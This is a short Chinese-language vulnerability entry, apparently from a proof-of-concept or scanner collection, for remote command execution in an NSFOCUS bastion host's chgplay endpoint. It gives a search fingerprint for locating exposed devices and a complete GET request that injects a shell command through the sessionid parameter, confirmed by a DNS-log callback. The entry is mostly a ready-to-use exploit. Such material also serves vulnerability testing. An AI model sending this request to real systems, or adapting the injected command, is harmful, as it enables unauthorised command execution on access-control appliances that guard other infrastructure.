# 绿盟堡垒机chgplay远程命令执行漏洞

绿盟堡垒机chgplay ｜ 命令执行 ｜ —
- **指纹**：`body="/guomi_USBkey.php"`
- **请求**：`GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=%3Bping%20www.dnslog.com%3B HTTP/1.1`
- **响应特征**：200 dnslog回显